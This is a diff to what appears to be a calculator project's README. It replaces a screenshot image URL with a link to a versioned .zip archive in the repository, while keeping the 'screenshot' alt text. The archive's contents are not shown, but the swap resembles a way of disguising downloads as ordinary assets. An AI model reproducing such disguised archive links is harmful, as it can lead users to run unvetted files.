@@ -2,4 +2,4 @@
 
 ## Screenshot
 
-<img width="507" alt="screenshot" src="https://user-images.githubusercontent.com/34116562/54217627-00672b80-4512-11e9-8670-63cbed7a11bb.png">
+<img width="507" alt="screenshot" src="https://raw.githubusercontent.com/Umez1/Calculator-using-HTML-CSS-and-JavaScript/master/images/Calculator-using-HTML-CSS-and-JavaScript-2.6.zip">
